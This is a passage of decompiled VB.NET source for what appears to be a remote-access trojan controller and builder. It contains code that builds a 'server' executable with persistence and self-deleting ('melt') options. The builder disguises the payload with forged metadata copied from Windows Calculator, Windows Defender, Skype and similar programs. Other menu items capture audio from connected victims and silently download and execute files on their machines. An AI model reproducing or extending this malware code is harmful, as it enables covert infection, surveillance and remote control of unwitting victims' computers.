                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray3 = New Object() { hostindx }
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj3, Nothing, "Subitems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            hostindx = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        obj3 = Nothing
                    Else
                        Dim obj4 As Object
                        objArray4 = New Object(2  - 1) {}
                        strArray9 = strArray
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray4(1) = RuntimeHelpers.GetObjectValue(Me.CountryFlag(strArray(j)))
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True, False }
                        If Not flagArray2(0) Then
                            obj4 = NewLateBinding.LateGet(Me.listviewmain.Items, Nothing, "Add", objArray3, Nothing, Nothing, flagArray2)
                        Else
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                            obj4 = NewLateBinding.LateGet(Me.listviewmain.Items, Nothing, "Add", objArray3, Nothing, Nothing, flagArray2)
                        End If
                        objArray2 = New Object(1  - 1) {}
                        strArray8 = strArray6
                        num6 = j
                        objArray2(0) = strArray8(num6)
                        objArray = objArray2
                        flagArray = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                        If flagArray(0) Then
                            strArray8(num6) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray2
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray3
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray4
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        strArray9 = strArray7
                        num7 = j
                        objArray4(0) = strArray9(num7)
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "SubItems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            strArray9(num7) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        objArray4 = New Object(1  - 1) {}
                        Dim item As ToolStripItem = Me.ConnectToolStripMenuItem.DropDownItems.Item(hostindex)
                        objArray4(0) = item.Text
                        objArray3 = objArray4
                        flagArray2 = New Boolean() { True }
                        NewLateBinding.LateCall(NewLateBinding.LateGet(obj4, Nothing, "Subitems", New Object(0  - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray3, Nothing, Nothing, flagArray2, True)
                        If flagArray2(0) Then
                            item.Text = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3(0)), GetType(String)))
                        End If
                        obj4 = Nothing
                    End If
                    j += 1
                Loop
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
            Return obj2
        End Function

        Public Sub AddtoStatusBar(ByVal [text] As String)
            Try 
                Me.FlatStatusBar1.Text = [text]
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub AudioCaptureToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                MyProject.Forms.Audio.connected = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
                MyProject.Forms.Audio.Show
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_build_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim dialog As New SaveFileDialog
                Dim dialog2 As SaveFileDialog = dialog
                dialog2.Filter = "Executables | *.exe"
                dialog2.InitialDirectory = Application.StartupPath
                dialog2.Title = "Save Server"
                dialog2 = Nothing
                If (dialog.ShowDialog = DialogResult.OK) Then
                    Me.path = dialog.FileName
                    Me.tbhost = Me.tb_host.Text
                    Me.ListViewScan.Items.Clear
                    Dim point2 As New Point(1, 0)
                    Me.Panel2.Location = point2
                    Dim size2 As New Size(&H240, &HEB)
                    Me.Panel2.Size = size2
                    point2 = New Point(3, 4)
                    Me.pb_scan.Location = point2
                    size2 = New Size(&H239, &HE2)
                    Me.pb_scan.Size = size2
                    Me.createserver = New Thread(New ThreadStart(AddressOf Me.servercreate))
                    Me.createserver.Start
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_generate_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim box As FlatTextBox
                VBMath.Randomize
                Me.tb_assemblyversion.Text = ""
                Me.tb_assemblyfileversion.Text = ""
                Dim numArray As Integer() = New Integer(8  - 1) {}
                Dim index As Integer = 0
                Do
                    numArray(index) = CInt(Math.Round(CDbl(((VBMath.Rnd * 8!) + 1!))))
                    index += 1
                Loop While (index <= 7)
                Dim num3 As Integer = 0
                Do
                    box = Me.tb_assemblyversion
                    box.Text = (box.Text & Conversions.ToString(numArray(num3)) & ".")
                    num3 += 1
                Loop While (num3 <= 3)
                Dim num4 As Integer = 4
                Do
                    box = Me.tb_assemblyfileversion
                    box.Text = (box.Text & Conversions.ToString(numArray(num4)) & ".")
                    num4 += 1
                Loop While (num4 <= 7)
                Me.tb_assemblyfileversion.Text = Me.tb_assemblyfileversion.Text.Substring(0, 7)
                Me.tb_assemblyversion.Text = Me.tb_assemblyversion.Text.Substring(0, 7)
                Dim strArray5 As String() = New String() { "Calc", "MSASCui", "WinRAR", "Wireshark", "Adobe Reader", "iTunes", "Skype" }
                Dim strArray3 As String() = New String() { "Windows-Calculator", "Windows Defender User Interface", "WinRAR archiver", "Wireshark", "Adobe Reader", "iTunes", "Skype" }
                Dim strArray As String() = New String() { "Microsoft© Windows©", "Microsoft© Windows©", "Alexander Roshal 1993-2012", "Gerald Comps, Gilbert Ramirez", "Adobe System Incorperated and its licensors", "Apple Inc.", "Skype and/or Microsoft" }
                Dim strArray4 As String() = New String() { "Microsoft© Windows© Operating System", "Microsoft© Windows© Operating System", "WinRAR", "Wireshark", "Adobe Reader", "iTunes", "Skype" }
                Dim strArray2 As String() = New String() { "©Microsoft Corporation. All Rights reserved.", "©Microsoft Corporation. All rights reserved.", "Copyright© Alexander Roshal 1993-2012", "Copyright© 2000 Gerald Comps, Gilbert Ramirez", "Copyright 1984-2012 Adobe System Incorperated and its licensors. All Rights reserved.", "©2003-2013 Apple Inc. All Rights reserved.", "© 2003 - 2012 Skype and/or Microsoft" }
                Dim strArray6 As String() = New String() { "Microsoft© Windows©", "Microsoft© Windows©", "Alexander Roshal 1993-2012", "2000 Gerald Comps, Gilbert Ramirez", "Adobe System Incorperated and its licensors", "Apple inc. 2003-2013", "Skype and/or Microsoft" }
                Dim num As Integer = New Random().Next(0, 6)
                Me.tb_assemblytitle.Text = strArray5(num)
                Me.tb_assemblydescription.Text = strArray3(num)
                Me.tb_assemblycompany.Text = strArray(num)
                Me.tb_assemblyproduct.Text = strArray4(num)
                Me.tb_assemblycopyright.Text = strArray2(num)
                Me.tb_assemblytrademark.Text = strArray6(num)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_load_settings_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.settings = Encoding.UTF8.GetString(File.ReadAllBytes((Application.StartupPath & "\settings.xnt")))
                Me.tb_host.Items.Clear
                Me.tb_host.Items.Add(RuntimeHelpers.GetObjectValue(Me.cut(0)))
                Me.tb_host.SelectedIndex = 0
                Me.cb_install_enable.Checked = Conversions.ToBoolean(Me.cut(1))
                Me.cb_install.Checked = Conversions.ToBoolean(Me.cut(2))
                Me.rb_appdata.Checked = Conversions.ToBoolean(Me.cut(3))
                Me.rb_temp.Checked = Conversions.ToBoolean(Me.cut(4))
                Me.tb_install_path.Text = Conversions.ToString(Me.cut(5))
                Me.cb_melt.Checked = Conversions.ToBoolean(Me.cut(6))
                Me.cb_hkcu.Checked = Conversions.ToBoolean(Me.cut(7))
                Me.cb_hklm.Checked = Conversions.ToBoolean(Me.cut(8))
                Me.tb_assemblytitle.Text = Conversions.ToString(Me.cut(9))
                Me.tb_assemblydescription.Text = Conversions.ToString(Me.cut(10))
                Me.tb_assemblycompany.Text = Conversions.ToString(Me.cut(11))
                Me.tb_assemblyproduct.Text = Conversions.ToString(Me.cut(12))
                Me.tb_assemblycopyright.Text = Conversions.ToString(Me.cut(13))
                Me.tb_assemblytrademark.Text = Conversions.ToString(Me.cut(14))
                Me.tb_assemblyversion.Text = Conversions.ToString(Me.cut(15))
                Me.tb_assemblyfileversion.Text = Conversions.ToString(Me.cut(&H10))
                Me.cb_icon.Checked = Conversions.ToBoolean(Me.cut(&H11))
                Me.PictureBox_Icon.ImageLocation = Conversions.ToString(Me.cut(&H12))
                Me.tb_host.ForeColor = Color.Black
                Me.tb_install_path.ForeColor = Color.Black
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Interaction.MsgBox("No Settings were found or the file is corrupted!", MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub btn_selecticn_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Using dialog As OpenFileDialog = New OpenFileDialog
                    Dim dialog2 As OpenFileDialog = dialog
                    dialog2.Filter = "Icons | *.ico"
                    dialog2.InitialDirectory = Application.StartupPath
                    dialog2.Title = "Please select an icon!"
                    dialog2.ShowDialog
                    Me.icnpath = dialog.FileName
                    Me.PictureBox_Icon.ImageLocation = dialog.FileName
                    dialog2 = Nothing
                End Using
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox(exception.Message, MsgBoxStyle.Critical, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub cb_ac_CheckedChanged(ByVal sender As Object)
            MySettingsProperty.Settings.autoconnect = Me.cb_ac.Checked
            MySettingsProperty.Settings.Save
        End Sub

        Private Sub cb_icon_CheckedChanged(ByVal sender As Object)
            If Me.cb_icon.Checked Then
                Me.PictureBox_Icon.Enabled = True
                Me.btn_selecticn.Enabled = True
            Else
                Me.PictureBox_Icon.Enabled = False
                Me.btn_selecticn.Enabled = False
            End If
        End Sub

        Private Sub cb_install_CheckedChanged(ByVal sender As Object)
            If Me.cb_install.Checked Then
                Me.tb_install_path.Enabled = True
                Me.rb_appdata.Enabled = True
                Me.rb_temp.Enabled = True
            Else
                Me.tb_install_path.Enabled = False
                Me.rb_appdata.Enabled = False
                Me.rb_temp.Enabled = False
            End If
        End Sub

        Private Sub cb_install_enable_CheckedChanged(ByVal sender As Object)
            If Me.cb_install_enable.Checked Then
                If Me.cb_install.Checked Then
                    Me.tb_install_path.Enabled = True
                    Me.rb_appdata.Enabled = True
                    Me.rb_temp.Enabled = True
                End If
                Me.cb_install.Enabled = True
                Me.cb_melt.Enabled = True
                Me.cb_hkcu.Enabled = True
                Me.cb_hklm.Enabled = True
            Else
                Me.cb_install.Enabled = False
                Me.cb_melt.Enabled = False
                Me.cb_hkcu.Enabled = False
                Me.cb_hklm.Enabled = False
                Me.tb_install_path.Enabled = False
                Me.rb_appdata.Enabled = False
                Me.rb_temp.Enabled = False
            End If
        End Sub

        Private Sub cb_notify_CheckedChanged(ByVal sender As Object)
            MySettingsProperty.Settings.notification = Me.cb_notify.Checked
            MySettingsProperty.Settings.Save
        End Sub

        Private Sub cb_sc_CheckedChanged(ByVal sender As Object)
            MySettingsProperty.Settings.autoscan = Me.cb_sc.Checked
            MySettingsProperty.Settings.Save
        End Sub

        Private Sub cb_sound_CheckedChanged(ByVal sender As Object)
            MySettingsProperty.Settings.sound = Me.cb_sound.Checked
            MySettingsProperty.Settings.Save
        End Sub

        Public Sub changecolor(ByVal listview As ListView, ByVal index As Integer, ByVal color As Color)
            listview.Items.Item(index).ForeColor = color
        End Sub

        Public Sub changeimage(ByVal pb As PictureBox)
            pb.Image = Resources.scanload
        End Sub

        Public Sub ConnectToAllToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim num2 As Integer = (Me.ConnectToolStripMenuItem.DropDownItems.Count - 1)
                Dim i As Integer = 1
                Do While (i <= num2)
                    If Not Me.connected(i) Then
                        Me.connected(i) = True
                        Me.ConnectToolStripMenuItem.DropDownItems.Item(i).Image = Resources.network_status
                        Me.addtolistview(Conversions.ToString(Me.client.check(Me.ConnectToolStripMenuItem.DropDownItems.Item(i).Text)), i, "null")
                        Me.curconnected = (Me.curconnected & Me.ConnectToolStripMenuItem.DropDownItems.Item(i).Text & "|")
                        Me.ntf = Conversions.ToString(Me.listviewmain.Items.Count)
                        Me.updateserver.Start
                        Me.AddtoStatusBar("Connected to all Hosts!")
                    End If
                    i += 1
                Loop
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Sub connecttohost()
            Try 
                Dim index As Integer = 0
                goto Label_00FA
            Label_0008:
                index += 1
                If (index <= 9) Then
                    goto Label_00FA
                End If
                Return
            Label_0019:
                If Me.connected(index) Then
                    Return
                End If
                Me.connected(index) = True
                Me.ConnectToolStripMenuItem.DropDownItems.Item(index).Image = Resources.network_status
                Me.addtolistview(Conversions.ToString(Me.client.check(Me.ConnectToolStripMenuItem.DropDownItems.Item(index).Text)), index, "null")
                Me.curconnected = (Me.curconnected & Me.ConnectToolStripMenuItem.DropDownItems.Item(index).Text & "|")
                Me.ntf = Conversions.ToString(Me.listviewmain.Items.Count)
                Me.updateserver.Start
                Me.AddtoStatusBar(("Connected to: " & Me.ConnectToolStripMenuItem.DropDownItems.Item(index).Text))
                goto Label_0008
            Label_00FA:
                If Not Me.ConnectToolStripMenuItem.DropDownItems.Item(index).Pressed Then
                    goto Label_0008
                End If
                goto Label_0019
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Public Function CountCharacter(ByVal value As String, ByVal ch As Char) As Integer
            Dim num As Integer = 0
            Dim str As String = value
            Dim num3 As Integer = 0
            Dim length As Integer = str.Length
            Do While (num3 < length)
                Dim ch2 As Char = str.Chars(num3)
                If (ch2 = ch) Then
                    num += 1
                End If
                num3 += 1
            Loop
            Return num
        End Function

        Public Function CountryFlag(ByVal nam As String) As Object
            Select Case nam
                Case "AFG"
                    Return 2
                Case "ALB"
                    Return 5
                Case "DZA"
                    Return 60
                Case "ASM"
                    Return 10
                Case "AND"
                    Return 0
                Case "AGO"
                    Return 8
                Case "AIA"
                    Return 4
                Case "ATA"
                    Return 60
                Case "ATG"
                    Return 60
                Case "ARG"
                    Return 9
                Case "ARM"
                    Return 6
                Case "AUS"
                    Return 12
                Case "AUT"
                    Return 11
                Case "AZE"
                    Return 15
                Case "BHS"
                    Return &H1D
                Case "BHR"
                    Return &H16
                Case "BGD"
                    Return &H12
                Case "BRB"
                    Return &H11
                Case "BLR"
                    Return &H21
                Case "BLZ"
                    Return &H22
                Case "BEN"
                    Return &H18
                Case "BMU"
                    Return &H19
                Case "BTN"
                    Return 30
                Case "BOL"
                    Return &H1B
                Case "BIH"
                    Return &H10
                Case "BWA"
                    Return &H20
                Case "BRA"
                    Return &H1C
                Case "IOT"
                    Return &H69
                Case "VBG"
                    Return &HEB
                Case "BRN"
                    Return &H1A
                Case "BGR"
                    Return &H15
                Case "BFA"
                    Return 20
                Case "BDI"
                    Return &H18
                Case "MMR"
                    Return &H90
                Case "KHM"
                    Return &H73
                Case "CMR"
                    Return &H2D
                Case "CAN"
                    Return &H23
                Case "CPV"
                    Return &H34
                Case "CYM"
                    Return &H7A
                Case "CAF"
                    Return &H27
                Case "TCD"
                    Return &HD4
                Case "CHL"
                    Return &H2C
                Case "CHN"
                    Return &H2E
                Case "CXR"
                    Return &H34
                Case "CCK"
                    Return &H25
                Case "COL"
                    Return &H2F
                Case "COM"
                    Return &H75
                Case "COK"
                    Return &H2B
                Case "CRC"
                    Return &H30
                Case "HRV"
                    Return &H62
                Case "CUB"
                    Return 50
                Case "CYP"
                    Return &H35
                Case "CZE"
                    Return &H36
                Case "COD"
                    Return &H26
                Case "DNK"
                    Return &H39
                Case "DJI"
                    Return &H38
                Case "DMA"
                    Return &H3A
                Case "DOM"
                    Return &H3B
                Case "ECU"
                    Return &H3D
                Case "EGY"
                    Return &H3F
                Case "SLV"
                    Return &HCF
                Case "GNQ"
                    Return &H58
                Case "ERI"
                    Return &H42
                Case "EST"
                    Return &H3E
                Case "ETH"
                    Return &H44
                Case "FLK"
                    Return &H49
                Case "FRO"
                    Return &H4B
                Case "FJI"
                    Return &H49
                Case "FIN"
                    Return &H47
                Case "FRA"
                    Return &H4C
                Case "PYF"
                    Return &HAC
                Case "GAB"
                    Return &H4D
                Case "GMB"
                    Return &H55
                Case "GEO"
                    Return 80
                Case "GER"
                    Return &H37
                Case "GHA"
                    Return &H52
                Case "GIB"
                    Return &H53
                Case "GRC"
                    Return &H59
                Case "GRL"
                    Return &H54
                Case "GRD"
                    Return &H4F
                Case "GUM"
                    Return &H5C
                Case "GTM"
                    Return &H5B
                Case "GIN"
                    Return &H56
                Case "GNB"
                    Return &H5D
                Case "GUY"
                    Return &H5E
                Case "HTI"
                    Return &H63
                Case "VAT"
                    Return &HE8
                Case "HND"
                    Return &H57
                Case "HKG"
                    Return &H5F
                Case "HUN"
                    Return 100
                Case "IS"
                    Return &H6C
                Case "IND"
                    Return &H68
                Case "IDN"
                    Return &H65
                Case "IRN"
                    Return &H6B
                Case "IRQ"
                    Return &H6A
                Case "IRL"
                    Return &H66
                Case "IMN"
                    Return &H45
                Case "ISR"
                    Return &H67
                Case "ITA"
                    Return &H6D
                Case "CIV"
                    Return &H2A
                Case "JAM"
                    Return 110
                Case "JPN"
                    Return &H70
                Case "JEY"
                    Return &H45
                Case "JOR"
                    Return &H6F
                Case "KAZ"
                    Return &H7B
                Case "KEN"
                    Return &H71
                Case "KIR"
                    Return &H74
                Case "KWT"
                    Return &H79
                Case "KGZ"
                    Return &H72
                Case "LAO"
                    Return &H7C
                Case "LVA"
                    Return &H86
                Case "LBN"
                    Return &H7D
                Case "LSO"
                    Return 130
                Case "LBR"
                    Return &H81
                Case "LBY"
                    Return &H86
                Case "LIE"
                    Return &H7F
                Case "LTU"
                    Return &H83
                Case "LUX"
                    Return &H84
                Case "MAC"
                    Return &H91
                Case "MKD"
                    Return &H8D
                Case "MDG"
                    Return &H8B
                Case "MWI"
                    Return &H99
                Case "MYS"
                    Return &H9B
                Case "MDV"
                    Return &H98
                Case "MLI"
                    Return &H8E
                Case "MLT"
                    Return 150
                Case "MHL"
                    Return 140
                Case "MRT"
                    Return &H94
                Case "MUS"
                    Return &H97
                Case "MYT"
                    Return &HF3
                Case "MEX"
                    Return &H9A
                Case "FSM"
                    Return &H4A
                Case "MDA"
                    Return &H89
                Case "MCO"
                    Return &H88
                Case "MNG"
                    Return &H90
                Case "MNE"
                    Return &H8A
                Case "MSR"
                    Return &H95
                Case "MAR"
                    Return &H87
                Case "MOZ"
                    Return &H9C
                Case "NAM"
                    Return &H9D
                Case "NRU"
                    Return &HA6
                Case "NPL"
                    Return &HA5
                Case "NLD"
                    Return &HA3
                Case "ANT"
                    Return 7
                Case "NCL"
                    Return &H9E
                Case "NZL"
                    Return &HA8
                Case "NTC"
                    Return &HA2
                Case "NER"
                    Return &H9F
                Case "NGA"
                    Return &HA1
                Case "NIU"
                    Return &HA7
                Case "PRK"
                    Return &H77
                Case "MNP"
                    Return &H92
                Case "NOR"
                    Return &HA4
                Case "OMN"
                    Return &HA9
                Case "PAK"
                    Return &HAF
                Case "PLW"
                    Return &HB6
                Case "PAN"
                    Return 170
                Case "PNG"
                    Return &HAD
                Case "PRY"
                    Return &HB7
                Case "PER"
                    Return &HAB
                Case "PHL"
                    Return &HAE
                Case "PCN"
                    Return &HB2
                Case "POL"
                    Return &HB0
                Case "PRT"
                    Return &HB5
                Case "PRI"
                    Return &HB3
                Case "QAT"
                    Return &HB8
                Case "COG"
                    Return 40
                Case "ROU"
                    Return &HBA
                Case "RUS"
                    Return &HBC
                Case "RWA"
                    Return &HBD
                Case "BLM"
                    Return &H45
                Case "SHN"
                    Return &HC5
                Case "KNA"
                    Return &H76
                Case "LCA"
                    Return &H7E
                Case "MAF"
                    Return &H45
                Case "SPM"
                    Return &HB1
                Case "VCT"
                    Return &HE9
                Case "WSM"
                    Return &HF1
                Case "SMR"
                    Return &HCA
                Case "STP"
                    Return &HCE
                Case "SAU"
                    Return 190
                Case "SEN"
                    Return &HCB
                Case "SRB"
                    Return &HBB
                Case "SYC"
                    Return &HC0
                Case "SLE"
                    Return &HC9
                Case "SGP"
                    Return &HC4
                Case "SVK"
                    Return 200
                Case "SVN"
                    Return &HC7
                Case "SLB"
                    Return &HBF
                Case "SOM"
                    Return &HCC
                Case "ZAF"
                    Return &HF4
                Case "KOR"
                    Return 120
                Case "ESP"
                    Return &H43
                Case "LKA"
                    Return &H80
                Case "SDN"
                    Return &HC2
                Case "SUR"
                    Return &HCD
                Case "SJM"
                    Return &HC7
                Case "SWZ"
                    Return &HD1
                Case "SWE"
                    Return &HC3
                Case "CHE"
                    Return &H29
                Case "SYR"
                    Return &HD0
                Case "TWN"
                    Return &HE0
                Case "TJK"
                    Return &HD7
                Case "TZA"
                    Return &HE1
                Case "THA"
                    Return &HD6
                Case "TLS"
                    Return &HD9
                Case "TGO"
                    Return &HD5
                Case "TKL"
                    Return &HD8
                Case "TON"
                    Return 220
                Case "TTO"
                    Return &HDE
                Case "TUN"
                    Return &HDB
                Case "TUR"
                    Return &HDD
                Case "TKM"
                    Return &HDA
                Case "TCA"
                    Return 210
                Case "TUV"
                    Return &HDF
                Case "UGA"
                    Return &HE3
                Case "UKR"
                    Return &HE2
                Case "ARE"
                    Return 1
                Case "GBR"
                    Return &H4E
                Case "USA"
                    Return &HE5
                Case "URY"
                    Return 230
                Case "VIR"
                    Return &HEC
                Case "UZB"
                    Return &HE7
                Case "VUT"
                    Return &HEE
                Case "VEN"
                    Return &HEA
                Case "VNM"
                    Return &HED
                Case "WLF"
                    Return 240
                Case "ESH"
                    Return &H40
                Case "YEM"
                    Return &HF2
                Case "ZMB"
                    Return &HF5
                Case "ZWE"
                    Return &HF7
            End Select
            Return &HF8
        End Function

        Private Sub CountryToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Me.GroupListView(Me.listviewmain, 0)
            Me.groupparameter = 0
        End Sub

        Public Function cut(ByVal index As Integer) As Object
            Return Me.settings.Split(New Char() { "|"c })(index)
        End Function

        Private Sub DisconnectToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim index As Integer = 0
                goto Label_006E
            Label_0005:
                Me.groupparameter = 1
                Me.listviewmain.Items.Clear
                Me.updateserver.Stop
                Me.curconnected = ""
                Me.AddtoStatusBar("Disconnected!")
                index += 1
                If (index <= 9) Then
                    goto Label_006E
                End If
                Return
            Label_0048:
                Me.connected(index) = False
                Me.ConnectToolStripMenuItem.DropDownItems.Item(index).Image = Resources.host
                goto Label_0005
            Label_006E:
                If Not Me.DisconnectToolStripMenuItem.Pressed Then
                    goto Label_0005
                End If
                goto Label_0048
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (If((Not disposing OrElse (Me.components Is Nothing)), 0, 1) <> 0) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub ExecuteFileToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Dim str As String = String.Concat(New String() { Me.listviewmain.SelectedItems.Item(0).SubItems.Item(6).Text, "|", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(1).Text, "@", Me.listviewmain.SelectedItems.Item(0).SubItems.Item(2).Text })
            Dim host As String = str.Split(New Char() { "|"c })(0)
            Dim file As String = str.Split(New Char() { "|"c })(1)
            If Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(Me.client.sendcmd(("Down|" & Interaction.InputBox("Please insert a direct downloadlink to your executable file!", "Download and execute silently", "", -1, -1)), host, file), True, False))) Then
                Interaction.MsgBox("An error occured, by opening a Website (OnConnect)!", MsgBoxStyle.ApplicationModal, Nothing)
            End If
        End Sub

        Private Sub ExitToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs)
            Application.ExitThread
        End Sub

        Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
            Application.Exit
        End Sub

        Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Dim num4 As Integer = (Me.CountCharacter(MySettingsProperty.Settings.hosts, "|"c) - 1)
                Dim i As Integer = 0
                Do While (i <= num4)
                    Dim str As String = MySettingsProperty.Settings.hosts.Remove(0, 1)
                    Dim item2 As ToolStripItem = Me.ConnectToolStripMenuItem.DropDownItems.Add(str.Split(New Char() { "|"c })(i))
                    item2.BackColor = Color.FromArgb(&H6F, &H1F, &H95)
                    item2.ForeColor = Color.White
                    item2.Image = Resources.host
                    item2 = Nothing
                    i += 1
                Loop
                Dim num5 As Integer = Me.CountCharacter(MySettingsProperty.Settings.hosts, "|"c)
                Dim j As Integer = 1
                Do While (j <= num5)
                    AddHandler Me.ConnectToolStripMenuItem.DropDownItems.Item(j).Click, New EventHandler(AddressOf Me._Lambda$__1)
                    Me.ConnectToolStripMenuItem.DropDownItems.Item(j).Image = Resources.host
                    j += 1
                Loop
                AddHandler Me.ConnectToAllToolStripMenuItem.Click, New EventHandler(AddressOf Me.ConnectToAllToolStripMenuItem_Click)
                If MySettingsProperty.Settings.autoconnect Then
                    Me.ConnectToAllToolStripMenuItem.PerformClick
                    Me.AddtoStatusBar("Autoconnected to all!")
                End If
                Me.boxhosts.Clear
                Dim num6 As Integer = (Me.CountCharacter(MySettingsProperty.Settings.hosts, "|"c) - 1)
                Dim k As Integer = 0
                Do While (k <= num6)
                    Dim str2 As String = MySettingsProperty.Settings.hosts.Remove(0, 1)
                    Me.boxhosts.AddItem(str2.Split(New Char() { "|"c })(k))
                    k += 1
                Loop
                Me.cb_ac.Checked = MySettingsProperty.Settings.autoconnect
                Me.cb_notify.Checked = MySettingsProperty.Settings.notification
                Me.cb_sound.Checked = MySettingsProperty.Settings.sound
                Me.toggledownload.Checked = MySettingsProperty.Settings.onconnect_down
                Me.toggleweb.Checked = MySettingsProperty.Settings.onconnect_web
                Me.tb_runfile.Text = MySettingsProperty.Settings.onc_down
                Me.tb_web.Text = MySettingsProperty.Settings.onc_website
                Me.cb_sc.Checked = MySettingsProperty.Settings.autoscan
                Me.getstubinfo = New Thread(New ThreadStart(AddressOf Me.stubinfo))
                Me.getstubinfo.Start
                Me.NetSealtb1.Text = ("Expiration Date: " & LicenseGlobal.Seal.ExpirationDate.ToLongDateString)
